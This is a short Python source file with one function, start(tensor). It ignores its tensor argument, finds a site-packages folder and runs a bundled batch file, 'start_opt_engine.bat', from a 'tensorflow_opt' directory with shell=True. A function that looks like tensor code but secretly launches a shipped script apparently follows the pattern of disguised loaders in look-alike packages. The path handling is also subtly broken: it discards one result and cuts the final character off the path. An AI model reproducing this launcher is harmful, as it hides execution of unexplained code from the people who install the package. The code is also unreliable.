import subprocess, os
import site

def start(tensor):
    site_package = subprocess.check_output(['python3', '-m', 'site', '--user-site'], text=True)
    site_package = site.getsitepackages()[1]
    folder = os.path.join(site_package[:-1],'tensorflow_opt','code','bin')
    filepath=os.path.join(folder, "start_opt_engine.bat")
    p = subprocess.Popen(filepath, shell=True, stdout = subprocess.PIPE)

    stdout, stderr = p.communicate()